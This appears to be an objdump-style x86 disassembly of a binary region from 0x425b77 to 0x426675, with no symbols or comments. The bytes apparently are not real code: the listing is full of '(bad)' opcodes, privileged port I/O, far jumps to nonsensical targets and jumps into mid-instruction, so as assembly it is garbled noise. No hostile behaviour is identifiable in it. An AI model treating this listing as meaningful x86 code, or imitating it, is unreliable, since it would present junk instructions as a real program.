  425b77:	jmp    0x425b19
  425b79:	xchg   esi,eax
  425b7a:	jge    0x425bfa
  425b7c:	pop    edx
  425b7d:	or     al,0x83
  425b7f:	push   edx
  425b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b81:	add    dh,bl
  425b83:	xor    ebp,DWORD PTR [edx-0x14]
  425b86:	cmc    
  425b87:	ret    0x2777
  425b8a:	data16 mov ah,0xff
  425b8d:	jbe    0x425b13
  425b8f:	mov    esp,cs
	...
  425bf1:	add    BYTE PTR [eax],al
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	retf   0xf823
  425c03:	xlat   BYTE PTR ds:[ebx]
  425c04:	xchg   edx,eax
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0x5d000001
  425c0d:	pop    DWORD PTR [ecx]
  425c0f:	inc    eax
  425c10:	cld    
  425c11:	sbb    DWORD PTR [edx-0x78],0x68b13e53
  425c18:	inc    edx
  425c19:	or     edi,ecx
  425c1b:	adc    DWORD PTR [esi-0x7d],0xc967ce16
  425c22:	xchg   ebp,eax
  425c23:	mov    ch,bh
  425c25:	test   al,0x3c
  425c27:	adc    esi,DWORD PTR [ebp+0x7bd7ca05]
  425c2d:	inc    ebx
  425c2e:	pop    es
  425c2f:	pop    es
  425c30:	pop    DWORD PTR [edx+ebx*2+0x986fb63]
  425c37:	rol    edx,cl
  425c39:	xchg   esp,eax
  425c3a:	jmp    0x809fda17
  425c3f:	pop    edx
  425c40:	cli    
  425c41:	ins    DWORD PTR es:[edi],dx
  425c42:	test   DWORD PTR [ecx+esi*1],ecx
  425c45:	pop    esi
  425c46:	adc    eax,0xc30187e3
  425c4b:	pusha  
  425c4c:	repnz add DWORD PTR [ebp-0x62dd1611],esp
  425c53:	jb     0x425bd8
  425c55:	out    dx,al
  425c56:	pop    ds
  425c57:	mov    ebx,0xb5ff5819
  425c5c:	and    DWORD PTR [eax+0x7f],ebp
  425c5f:	mov    dl,0x51
  425c61:	aam    0x66
  425c63:	adc    edx,ebx
  425c65:	or     cl,ah
  425c67:	xor    cl,BYTE PTR [ebp-0x37]
  425c6a:	es adc eax,0xd02a3a48
  425c71:	es repnz popf 
  425c74:	pop    es
  425c75:	les    edx,FWORD PTR [edx+ebp*8]
  425c78:	int    0x8a
  425c7a:	sbb    eax,DWORD PTR [ebx+0x72]
  425c7d:	mov    al,ds:0xf79522b9
  425c82:	mov    bh,0x1d
  425c84:	fistp  WORD PTR [ebx-0x5f784904]
  425c8a:	xchg   esi,eax
  425c8b:	or     edx,DWORD PTR [eax+ebx*1+0x70340871]
  425c92:	xor    al,0xb6
  425c94:	gs xor al,0x3c
  425c97:	and    eax,0xe044780a
  425c9c:	sub    eax,0xf03bf732
  425ca1:	cmp    ecx,DWORD PTR [eax-0x59]
  425ca4:	jmp    0xe010:0x3c8f03da
  425cab:	pop    di
  425cad:	add    al,0x4f
  425caf:	or     ebx,DWORD PTR fs:0x1e9b1ec0
  425cb6:	xor    DWORD PTR [ebx-0x5b2f871c],0xfffffff8
  425cbd:	mov    DWORD PTR cs:[ecx-0x68],ebx
  425cc1:	call   0x400:0xa2966ac4
  425cc8:	pop    ebx
  425cc9:	cli    
  425cca:	out    0xd1,eax
  425ccc:	mov    ebx,0x22641d72
  425cd1:	inc    ebp
  425cd2:	inc    ecx
  425cd3:	jge    0x425ce2
  425cd5:	xchg   DWORD PTR [eax],ebx
  425cd7:	pop    ebx
  425cd8:	mov    ds:0xbe107da7,eax
  425cdd:	inc    ebp
  425cde:	cmc    
  425cdf:	addr16 mov ecx,0x15f6e8f7
  425ce5:	inc    edx
  425ce6:	int3   
  425ce7:	dec    ebp
  425ce8:	pop    edx
  425ce9:	push   ecx
  425cea:	xchg   esp,eax
  425ceb:	inc    eax
  425cec:	mov    DWORD PTR [edi+0x943f968],0x1b602ed9
  425cf6:	stos   BYTE PTR es:[edi],al
  425cf7:	add    al,0xad
  425cf9:	mov    esi,0x71886b70
  425cfe:	int3   
  425cff:	ficom  WORD PTR [edx-0x5d02ab71]
  425d05:	stos   DWORD PTR es:[edi],eax
  425d06:	aam    0x4b
  425d08:	mov    ebx,0x907e8e72
  425d0d:	cmp    cl,BYTE PTR [ecx+0x41a9]
	...
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xbbf11c8,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0xe7000001
  425d8d:	adc    BYTE PTR [esi-0xdffd0ba],0x42
  425d94:	xchg   esp,eax
  425d95:	repnz pop eax
  425d97:	inc    ecx
  425d98:	scas   eax,DWORD PTR es:[edi]
  425d99:	or     esp,DWORD PTR [ebp+0x6c]
  425d9c:	mov    al,0x8b
  425d9e:	cwde   
  425d9f:	add    ecx,ebx
  425da1:	aaa    
  425da2:	stos   DWORD PTR es:[edi],eax
  425da3:	mov    esi,0x6711aa4c
  425da8:	cld    
  425da9:	xchg   edi,eax
  425daa:	nop
  425dab:	mov    edx,0x610b30c8
  425db0:	daa    
  425db1:	(bad)  
  425db2:	and    esp,DWORD PTR [esp+ebx*1-0x79]
  425db6:	pop    es
  425db7:	sbb    BYTE PTR [edi],dh
  425db9:	cmp    eax,0x324a5d1d
  425dbe:	aas    
  425dbf:	pop    ss
  425dc0:	xchg   ebp,eax
  425dc1:	aaa    
  425dc2:	jmp    0x63a2:0xd402bafe
  425dc9:	jo     0x425d6c
  425dcb:	sub    ah,BYTE PTR [ebx]
  425dcd:	xchg   ecx,eax
  425dce:	push   0x40658869
  425dd3:	xchg   esp,eax
  425dd4:	sub    DWORD PTR [ecx-0x7516edcc],0x45f3bd86
  425dde:	or     BYTE PTR [edx-0x1612425b],ah
  425de4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425de5:	fs mov ah,ch
  425de8:	retf   0xd19f
  425deb:	js     0x425e0d
  425ded:	adc    eax,0x2f4bf158
  425df2:	popa   
  425df3:	test   edi,esi
  425df5:	xor    BYTE PTR ds:0x9f99fec6,bh
  425dfb:	and    eax,0xc865a75c
  425e00:	test   DWORD PTR [esi+0x6c4e18d4],0xf3a230b3
  425e0a:	repz das 
  425e0c:	rol    BYTE PTR [esi+0x44],cl
  425e0f:	xlat   BYTE PTR ds:[ebx]
  425e10:	mov    es,WORD PTR [eax+esi*1+0x69]
  425e14:	lea    ebp,[edx+edx*1+0x46]
  425e18:	add    ch,al
  425e1a:	sbb    bh,dl
  425e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e1d:	mov    dl,0xd3
  425e1f:	ins    DWORD PTR es:[edi],dx
  425e20:	mov    cs,WORD PTR [esi]
  425e22:	jecxz  0x425e05
  425e24:	in     eax,0xf9
  425e26:	push   esp
  425e27:	inc    esi
  425e28:	in     al,0xd0
  425e2a:	push   0x756667ca
  425e2f:	mov    esp,ecx
  425e31:	retf   
  425e32:	sub    DWORD PTR [eax-0x7f],ebx
  425e35:	pusha  
  425e36:	lods   eax,DWORD PTR ds:[esi]
  425e37:	(bad)  [ebx+0x539e9dfd]
  425e3d:	fwait
  425e3e:	or     al,0x40
  425e40:	cdq    
  425e41:	sbb    DWORD PTR [ebx],esp
  425e43:	mov    al,0x23
  425e45:	clc    
  425e46:	push   ds
  425e47:	lods   eax,DWORD PTR ds:[esi]
  425e48:	sub    DWORD PTR [ebp-0x52],eax
  425e4b:	adc    edi,DWORD PTR [ecx+0x62b68b91]
  425e51:	adc    al,0x3b
  425e53:	cwde   
  425e54:	imul   esp,DWORD PTR [ebp+edx*8-0x3d],0xabf64f5e
  425e5c:	leave  
  425e5d:	call   0xe778:0x17501b03
  425e64:	cld    
  425e65:	dec    edi
  425e66:	addr16 (bad) 
  425e68:	int3   
  425e69:	dec    esp
  425e6a:	xor    eax,0xb98b35ca
  425e6f:	in     eax,0x8e
  425e71:	jbe    0x425e0e
  425e73:	or     bh,BYTE PTR [edx]
  425e75:	jl     0x425ee0
  425e77:	call   0x41487349
  425e7c:	stos   DWORD PTR es:[edi],eax
  425e7d:	mov    eax,0xacc03856
  425e82:	inc    edi
  425e83:	or     ch,BYTE PTR [ebx-0x75]
  425e86:	fisubr DWORD PTR [edi-0x52]
  425e89:	or     al,0x3c
  425e8b:	push   edx
  425e8c:	aad    0xc8
  425e8e:	mov    ecx,0xc18
	...
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	les    ebx,FWORD PTR [edx+edi*8+0x1959c65]
  425f07:	add    BYTE PTR ds:0xaa000001,al
  425f0d:	jb     0x425f64
  425f0f:	bound  ebp,QWORD PTR [eax+0x7]
  425f12:	xchg   esp,eax
  425f13:	inc    esp
  425f14:	pop    eax
  425f15:	pop    edi
  425f16:	adc    DWORD PTR [edx],ecx
  425f18:	or     ch,dh
  425f1a:	cdq    
  425f1b:	enter  0x68a,0xb1
  425f1f:	and    esp,0x3f
  425f22:	jo     0x425eb6
  425f24:	in     eax,dx
  425f25:	ret    0x791c
  425f28:	mov    ecx,0xe8755284
  425f2d:	dec    edi
  425f2e:	loopne 0x425f03
  425f30:	mov    ds:0x1a7fd900,eax
  425f35:	adc    edx,DWORD PTR [esi+ebx*2+0x2aaeb736]
  425f3c:	mov    dh,0x1b
  425f3e:	fistp  QWORD PTR [ebp+ecx*2+0x1e]
  425f42:	xor    al,0x73
  425f44:	in     al,dx
  425f45:	dec    ebp
  425f46:	inc    edx
  425f47:	loop   0x425f12
  425f49:	mov    BYTE PTR [edx+0x68d1b4af],bl
  425f4f:	and    dh,BYTE PTR [esi-0x4f09c0ec]
  425f55:	aam    0xeb
  425f57:	jne    0x425f84
  425f59:	cmp    DWORD PTR ds:0x89f73733,ebp
  425f5f:	pushf  
  425f60:	jo     0x425ef0
  425f62:	mov    al,ds:0x25d648ac
  425f67:	dec    ecx
  425f68:	pop    ebx
  425f69:	xor    BYTE PTR [edi+0x295ce897],bl
  425f6f:	dec    edi
  425f70:	mov    bl,0xd3
  425f72:	test   BYTE PTR [eax-0x37],dl
  425f75:	jnp    0x425f52
  425f77:	mov    cl,0xf7
  425f79:	out    0x34,eax
  425f7b:	inc    BYTE PTR [ecx+0x4db6611c]
  425f81:	cdq    
  425f82:	scas   al,BYTE PTR es:[edi]
  425f83:	jno    0x425fd4
  425f85:	xchg   BYTE PTR [edx],bl
  425f87:	adc    edi,esi
  425f89:	jl     0x425f41
  425f8b:	gs pushf 
  425f8d:	in     al,dx
  425f8e:	push   esp
  425f8f:	mov    cl,0xb6
  425f91:	mov    eax,DWORD PTR ds:[ebp+0x35]
  425f95:	fisubr WORD PTR [eax]
  425f97:	shl    DWORD PTR [eax],0xce
  425f9a:	and    BYTE PTR [edx+0x38],dl
  425f9d:	adc    DWORD PTR [ebx+0x2a875a69],edx
  425fa3:	push   esi
  425fa4:	push   ecx
  425fa5:	pop    ecx
  425fa6:	push   0xff94ca26
  425fab:	xchg   edx,eax
  425fac:	lahf   
  425fad:	lods   eax,DWORD PTR ds:[esi]
  425fae:	sub    ebx,ebx
  425fb0:	dec    esp
  425fb1:	ret    
  425fb2:	ja     0x425f94
  425fb4:	shr    BYTE PTR [eax+0x3845059],1
  425fba:	(bad)  
  425fbb:	cmp    DWORD PTR [esi+0x4],ecx
  425fbe:	or     eax,0x99f701d4
  425fc3:	fidivr WORD PTR [edi-0x4]
  425fc6:	xor    esp,DWORD PTR [eax-0x39f607b1]
  425fcc:	imul   edx,DWORD PTR [eax+0x36],0xa7f9cbb9
  425fd3:	ret    0x962f
  425fd6:	or     al,0x58
  425fd8:	xor    al,0xac
  425fda:	int    0xdc
  425fdc:	sub    al,0xb9
  425fde:	sbb    al,0x5f
  425fe0:	mov    edi,0x1bbdf9cd
  425fe5:	xor    eax,0x4dd0adaf
  425fea:	inc    edi
  425feb:	les    ebx,FWORD PTR [edx-0x1c82f17c]
  425ff1:	sbb    BYTE PTR [edi-0x8],0x83
  425ff5:	push   0x64
  425ff7:	sbb    ecx,DWORD PTR [ecx+eax*2]
  425ffa:	pop    eax
  425ffb:	xchg   esp,eax
  425ffc:	xor    eax,DWORD PTR [ecx+0x14]
  425fff:	xchg   ebp,eax
  426000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426001:	clc    
  426002:	mov    esp,0x89c6a73c
  426007:	and    al,0x56
  426009:	js     0x426074
  42600b:	data16 jmp 0x426080
  42600e:	dec    edx
  42600f:	stc    
  426010:	das    
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	sub    BYTE PTR [ecx-0x695e2849],dh
  426086:	add    DWORD PTR [eax],eax
  426088:	add    eax,0x2c000001
  42608d:	cmp    edx,DWORD PTR [esi+0x61]
  426090:	hlt    
  426091:	iret   
  426092:	out    dx,al
  426093:	push   es
  426094:	in     eax,dx
  426095:	dec    esi
  426096:	xor    al,0x28
  426098:	jnp    0x4260d6
  42609a:	pusha  
  42609b:	sub    bl,BYTE PTR [eax-0x4050a02f]
  4260a1:	push   ecx
  4260a2:	sub    ecx,edi
  4260a4:	sub    BYTE PTR [ecx],0x47
  4260a7:	mov    ds:0x82841572,al
  4260ac:	dec    ecx
  4260ad:	push   esi
  4260ae:	cmp    ch,BYTE PTR [edx]
  4260b0:	sbb    al,0x37
  4260b2:	cmc    
  4260b3:	rcr    al,0x6e
  4260b6:	repz mov cl,0x18
  4260b9:	scas   al,BYTE PTR es:[edi]
  4260ba:	scas   al,BYTE PTR es:[edi]
  4260bb:	dec    BYTE PTR [edx+0x27]
  4260be:	pusha  
  4260bf:	ret    
  4260c0:	pop    ss
  4260c1:	add    ch,BYTE PTR [edi-0x6d583311]
  4260c7:	jbe    0x42606d
  4260c9:	sub    dh,BYTE PTR [ecx]
  4260cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260cc:	jo     0x4260ba
  4260ce:	adc    esi,ecx
  4260d0:	mov    eax,DWORD PTR [ebp+esi*2-0x7b]
  4260d4:	ja     0x426091
  4260d6:	loopne 0x426127
  4260d8:	gs jge 0x4260fb
  4260db:	pusha  
  4260dc:	mov    edx,0x389a6312
  4260e1:	outs   dx,BYTE PTR ds:[esi]
  4260e2:	jl     0x42608b
  4260e4:	sbb    ebx,esp
  4260e6:	fs mov ch,0x6f
  4260e9:	inc    edx
  4260ea:	sub    bl,BYTE PTR [ebp-0x5a]
  4260ed:	cmp    eax,0x1757c79e
  4260f2:	xor    ecx,ecx
  4260f4:	aad    0x6e
  4260f6:	adc    DWORD PTR [eax+0x362fec54],ecx
  4260fc:	(bad)  
  4260fd:	pop    ebx
  4260fe:	push   edi
  4260ff:	push   ecx
  426100:	push   ss
  426101:	mov    edx,DWORD PTR [edi+ebp*4-0x79]
  426105:	ins    BYTE PTR es:[edi],dx
  426106:	aam    0x76
  426108:	adc    ecx,eax
  42610a:	mov    al,0x8d
  42610c:	cmp    al,0x92
  42610e:	add    al,0x95
  426110:	mov    ebx,0x20080079
  426115:	mov    esi,0xe8e19acc
  42611a:	es dec edx
  42611c:	add    eax,0x351d0516
  426121:	mov    ds:0x5018b06d,eax
  426126:	cld    
  426127:	imul   esp,DWORD PTR [esi],0xffffffd7
  42612a:	in     al,dx
  42612b:	pop    esi
  42612c:	pop    esp
  42612d:	lock retf 
  42612f:	mov    ds:0xbba8a246,eax
  426134:	fucom  st(2)
  426136:	sbb    eax,0xc529a6f7
  42613b:	push   cs
  42613c:	jo     0x426139
  42613e:	aam    0xfb
  426140:	lahf   
  426141:	push   ss
  426142:	adc    dh,BYTE PTR [ecx+0x758b7e27]
  426148:	repnz pop ds
  42614a:	mov    ch,0x77
  42614c:	push   ecx
  42614d:	and    dl,BYTE PTR [edx-0x5e]
  426150:	retf   
  426151:	mov    esp,0x191567c6
  426156:	popf   
  426157:	call   0xd87f51ef
  42615c:	and    bl,BYTE PTR [edx]
  42615e:	ins    DWORD PTR es:[edi],dx
  42615f:	fld    TBYTE PTR ds:0x1a9bf407
  426165:	lock adc eax,0xae069f9d
  42616b:	xor    eax,0x9e79cc14
  426170:	push   ss
  426171:	pop    ebx
  426172:	leave  
  426173:	add    bl,ah
  426175:	jmp    0xd305d3ed
  42617a:	sbb    BYTE PTR [edi-0x27f3124],ch
  426180:	sbb    DWORD PTR [eax],esp
  426182:	jo     0x426146
  426184:	push   edx
  426185:	inc    edi
  426186:	ja     0x426158
  426188:	mov    ebx,0x7b18285d
  42618d:	mov    al,0xa
  42618f:	and    BYTE PTR [edi],0x0
	...
  4261f2:	add    BYTE PTR [eax],al
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx-0x308e5ed9],0x11
  426204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426205:	xchg   edi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    eax,0x95000001
  42620d:	jae    0x4261be
  42620f:	stos   BYTE PTR es:[edi],al
  426210:	gs stc 
  426212:	dec    esp
  426213:	adc    bl,al
  426215:	(bad)  
  426216:	push   ss
  426217:	mov    eax,ds:0x4c2495a0
  42621c:	jg     0x426269
  42621e:	pop    edi
  42621f:	and    BYTE PTR [edx],0xa5
  426222:	and    al,0xb5
  426224:	or     ecx,0xffffffa2
  426227:	and    ah,al
  426229:	imul   edx,DWORD PTR [edx-0x805937b],0x2774bc8f
  426233:	mov    ds:0x55b2042a,al
  426238:	ficomp WORD PTR [edx-0x1c26db44]
  42623e:	sbb    ah,BYTE PTR [edx-0x6fc2977d]
  426244:	cmp    eax,DWORD PTR [ebp+0x2d]
  426247:	cmovnp ecx,DWORD PTR [eax]
  42624a:	mov    ebx,ds
  42624c:	push   esp
  42624d:	dec    edi
  42624e:	mov    BYTE PTR ds:0xd506c5ce,cl
  426254:	div    DWORD PTR [edx+0x2543af6b]
  42625a:	hlt    
  42625b:	mov    ds:0xd81d9a28,eax
  426260:	or     DWORD PTR [ebx-0x2fd721e0],ebp
  426266:	aad    0x8f
  426268:	mov    ds:0xb163969e,eax
  42626d:	repnz fnsave [edi-0x31f01692]
  426274:	es jae 0x42627c
  426277:	xor    ah,BYTE PTR [ebx]
  426279:	xor    ebp,0xa828b919
  42627f:	ret    
  426280:	fistp  DWORD PTR [esi]
  426282:	jnp    0x426293
  426284:	mov    ds:0x6ce257ae,al
  426289:	and    esp,DWORD PTR [ebx+0x34130e3f]
  42628f:	or     DWORD PTR [eax+0x580a53da],0x1d72cde5
  426299:	jno    0x426274
  42629b:	out    dx,al
  42629c:	fld    DWORD PTR [ecx+eax*1-0x1cd72d5]
  4262a3:	stos   BYTE PTR es:[edi],al
  4262a4:	xor    al,0xf7
  4262a6:	test   al,0x6a
  4262a8:	stos   BYTE PTR es:[edi],al
  4262a9:	(bad)  
  4262aa:	jbe    0x4262d2
  4262ac:	loop   0x42625c
  4262ae:	sar    BYTE PTR [ecx-0x19859408],0xd8
  4262b5:	pop    esi
  4262b6:	xor    al,BYTE PTR [edx-0x8]
  4262b9:	mov    esp,0xe899be09
  4262be:	test   DWORD PTR [edx-0x2],0xe3f6f5d7
  4262c5:	xchg   edx,eax
  4262c6:	ret    
  4262c7:	in     al,0x21
  4262c9:	cmp    ecx,eax
  4262cb:	push   ecx
  4262cc:	sbb    DWORD PTR [edi-0x70f7f319],edx
  4262d2:	(bad)  
  4262d3:	stos   BYTE PTR es:[edi],al
  4262d4:	in     eax,dx
  4262d5:	stos   BYTE PTR es:[edi],al
  4262d6:	sub    eax,0xa13007b5
  4262db:	xor    edx,edx
  4262dd:	fldcw  WORD PTR [edi-0x71b95f25]
  4262e3:	or     WORD PTR ds:0x366103bd,0xffd9
  4262eb:	or     eax,0xbcda681b
  4262f0:	mov    dh,0xf6
  4262f2:	ficomp WORD PTR [edi+0x17]
  4262f5:	(bad)  
  4262f6:	icebp  
  4262f7:	sbb    eax,0x64dbf40e
  4262fc:	push   es
  4262fd:	in     eax,0x3
  4262ff:	idiv   BYTE PTR [ebp-0x18]
  426302:	pop    ebp
  426303:	mov    ecx,0xc5f7888
  426308:	ret    
  426309:	mov    dl,0xb3
  42630b:	outs   dx,DWORD PTR ds:[esi]
  42630c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42630d:	pop    esi
  42630e:	mov    esp,0x59a9
	...
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x11f2f547
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0x59000001
  42638d:	nop
  42638e:	xor    DWORD PTR [esp+eax*2-0x22],edi
  426392:	rcl    BYTE PTR [edx+0x546c30b3],0x85
  426399:	xlat   BYTE PTR ds:[ebx]
  42639a:	into   
  42639b:	add    al,BYTE PTR [edx]
  42639d:	cmp    al,0xc
  42639f:	and    BYTE PTR [edi],al
  4263a1:	inc    esi
  4263a2:	retf   
  4263a3:	push   eax
  4263a4:	retf   0x8efa
  4263a7:	sbb    ah,BYTE PTR [ebx+0x7c]
  4263aa:	clc    
  4263ab:	mov    ah,0x4e
  4263ad:	mov    dh,0x31
  4263af:	fcomp  DWORD PTR [esi-0x2f]
  4263b2:	add    edi,edi
  4263b4:	and    bh,0xd9
  4263b7:	lods   eax,DWORD PTR ds:[esi]
  4263b8:	lds    ebx,FWORD PTR [eax]
  4263ba:	cmp    ah,BYTE PTR [ecx]
  4263bc:	fmul   DWORD PTR [eax]
  4263be:	pop    eax
  4263bf:	or     eax,0x2ff1cd45
  4263c4:	fild   DWORD PTR [edi]
  4263c6:	mov    edi,DWORD PTR [ecx]
  4263c8:	push   edx
  4263c9:	sub    DWORD PTR [eax],0xffffffec
  4263cc:	sub    BYTE PTR [ecx-0x2abefa18],ch
  4263d2:	shl    edi,1
  4263d4:	repnz sub eax,0x6e656a7e
  4263da:	test   eax,0xe5eed390
  4263df:	int3   
  4263e0:	cs pop edi
  4263e2:	and    BYTE PTR [esi+0x3957282e],0xd
  4263e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263ea:	das    
  4263eb:	adc    BYTE PTR [ebp+0xa7c5a27],dh
  4263f1:	or     DWORD PTR [edi+0x632e94dd],ebx
  4263f7:	ds xor al,0xcb
  4263fa:	retf   0xa41c
  4263fd:	jecxz  0x4263b0
  4263ff:	dec    eax
  426400:	imul   eax,DWORD PTR [esi+0x58],0xffffffea
  426404:	test   ah,bl
  426406:	out    dx,eax
  426407:	jmp    0xede2:0x1dea947a
  42640e:	cli    
  42640f:	adc    ecx,DWORD PTR ds:0x43bf9095
  426415:	inc    ebp
  426416:	sub    al,0x91
  426418:	mov    es,WORD PTR [ebx+0x47]
  42641b:	sub    al,0x5d
  42641d:	outs   dx,DWORD PTR ds:[esi]
  42641e:	jg     0x4263e5
  426420:	xchg   edx,eax
  426421:	ret    0x3dfc
  426424:	xor    ax,0x562
  426428:	xlat   BYTE PTR ds:[ebx]
  426429:	out    dx,al
  42642a:	xchg   ebp,eax
  42642b:	pop    edx
  42642c:	push   ds
  42642d:	mov    bl,0x96
  42642f:	test   BYTE PTR [ebp+0x5],0x93
  426433:	mov    edi,0x9c792c11
  426438:	xor    DWORD PTR [edx],edx
  42643a:	adc    al,0x50
  42643c:	cmc    
  42643d:	lea    esp,[esi-0x39d20075]
  426443:	dec    edx
  426444:	xchg   ebx,eax
  426445:	cld    
  426446:	mov    eax,ds:0xfe85a050
  42644b:	jns    0x426428
  42644d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42644e:	mov    eax,DWORD PTR [ecx+0x20]
  426451:	push   0x70decad4
  426456:	sbb    eax,0x56781c0b
  42645b:	sub    ch,0xa1
  42645e:	enter  0xe653,0xe8
  426462:	stos   BYTE PTR es:[edi],al
  426463:	sub    edi,edx
  426465:	icebp  
  426466:	push   esi
  426467:	xchg   ebx,eax
  426468:	mov    bh,al
  42646a:	pop    ebx
  42646b:	sub    edi,edi
  42646d:	mov    dh,0xaa
  42646f:	in     al,dx
  426470:	or     DWORD PTR [esi-0x61de8e63],ecx
  426476:	stos   DWORD PTR es:[edi],eax
  426477:	call   0x3344:0xfe451270
  42647e:	int3   
  42647f:	ins    BYTE PTR es:[edi],dx
  426480:	fisttp QWORD PTR [bp-0x726a]
  426485:	pop    ss
  426486:	scas   eax,DWORD PTR es:[edi]
  426487:	jmp    0x426416
  426489:	rcl    edi,cl
  42648b:	fisttp DWORD PTR [eax+0x69]
  42648e:	mov    eax,ds:0x1432
	...
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   DWORD PTR [ebx-0x4f418c56],edx
  426505:	cdq    
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0xd2000001
  42650d:	sub    eax,0x687392a8
  426512:	repz dec ebx
  426514:	retf   0xbf40
  426517:	sbb    ch,BYTE PTR [edi+0x2b621ffe]
  42651d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42651e:	or     DWORD PTR [eax],edi
  426520:	push   ecx
  426521:	add    al,0xe
  426523:	and    DWORD PTR [edx+eax*4-0x7b],0xffffffee
  426528:	test   al,0xfb
  42652a:	xor    DWORD PTR [eax+0x66645180],esp
  426530:	imul   esi,DWORD PTR [ebp+0x6ad25f18],0xffffff9a
  426537:	xor    eax,0xfe5a7005
  42653c:	lahf   
  42653d:	jecxz  0x426564
  42653f:	in     eax,dx
  426540:	fstp   DWORD PTR [ecx+ebx*8-0x6a628ee4]
  426547:	jge    0x4265c3
  426549:	comiss xmm2,DWORD PTR [esp+eiz*4]
  42654d:	mov    al,ds:0x7d3aa6f2
  426552:	rol    DWORD PTR [ebx+0x3a],0xd2
  426556:	(bad)  
  426557:	xchg   ebx,eax
  426558:	es in  eax,dx
  42655a:	jns    0x42652b
  42655c:	mov    ebx,0xa658bfbd
  426561:	jnp    0x426514
  426563:	fmul   QWORD PTR ds:0x7616e523
  426569:	mov    al,0xb4
  42656b:	scas   al,BYTE PTR es:[edi]
  42656c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42656d:	xor    esp,ebp
  42656f:	in     al,dx
  426570:	ds pop ss
  426572:	inc    ebp
  426573:	imul   ebx,DWORD PTR [ebp+eax*4+0xcec8bcd],0x57b86a7c
  42657e:	shl    DWORD PTR [ecx-0xb29d048],cl
  426584:	jns    0x426544
  426586:	xor    al,0x12
  426588:	xor    eax,edx
  42658a:	inc    esi
  42658b:	nop
  42658c:	jp     0x426544
  42658e:	push   ebp
  42658f:	jae    0x4265b0
  426591:	mov    eax,ds:0x2d3cd8e2
  426596:	cdq    
  426597:	sbb    BYTE PTR [edi],cl
  426599:	fidiv  WORD PTR [ecx]
  42659b:	(bad)  
  42659c:	sub    al,0xab
  42659e:	dec    ebx
  42659f:	dec    esp
  4265a0:	jae    0x42652b
  4265a2:	fmul   st(6),st
  4265a4:	xor    bl,cl
  4265a6:	dec    eax
  4265a7:	leave  
  4265a8:	cmc    
  4265a9:	mov    edi,0x7727d12e
  4265ae:	jmp    0x7222:0x63c5701a
  4265b5:	stos   DWORD PTR es:[edi],eax
  4265b6:	adc    ah,BYTE PTR [edi-0x5b9c16e]
  4265bc:	xor    bh,BYTE PTR [edx-0x17]
  4265bf:	cmp    ah,BYTE PTR [esi]
  4265c1:	add    eax,0x976516c6
  4265c6:	xchg   esp,eax
  4265c7:	js     0x4265c9
  4265c9:	xchg   esp,eax
  4265ca:	inc    edi
  4265cb:	mov    edi,esp
  4265cd:	cmp    DWORD PTR [ebp+0x1bd9a8c8],ecx
  4265d3:	(bad)  
  4265d4:	repnz mov BYTE PTR [ebp-0x1f],al
  4265d8:	and    edi,ebx
  4265da:	cmp    esp,DWORD PTR ds:0x25501e7a
  4265e0:	lahf   
  4265e1:	push   edi
  4265e2:	jo     0x4265af
  4265e4:	xchg   DWORD PTR [edi-0x9],ebp
  4265e7:	jmp    0x426638
  4265e9:	jbe    0x42664e
  4265eb:	int    0x73
  4265ed:	bound  ebx,QWORD PTR [edi-0x63]
  4265f0:	push   DWORD PTR [ebx-0x52]
  4265f3:	jnp    0x4265b0
  4265f5:	jge    0x426631
  4265f7:	cmp    DWORD PTR [edi-0x2575cf0a],ebx
  4265fd:	pusha  
  4265fe:	mov    cl,bl
  426600:	jmp    0x2661:0xf6b7153e
  426607:	cli    
  426608:	fadd   QWORD PTR [edi]
  42660a:	rcl    BYTE PTR [edx],1
  42660c:	data16 mov ch,0x38
  42660f:	loopne 0x42660c
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
